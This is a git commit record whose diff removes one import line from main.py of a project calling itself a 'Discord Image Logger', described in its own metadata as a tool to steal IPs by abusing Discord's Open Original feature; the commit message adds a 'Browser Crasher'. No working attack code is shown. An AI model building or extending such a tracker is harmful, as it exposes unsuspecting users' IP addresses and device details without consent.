6fc508875eb4548adc08ff539db9d191d107487f
DeKrypt <52050537+dekrypted@users.noreply.github.com>
2023-01-26 21:52:49 -0500

    Mega Update
    + Browser Crasher, Antispam, Redirect, More Custom Stuff :)

--- main.py
+++ main.py
@@ -4,7 +4,6 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
-import sys
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
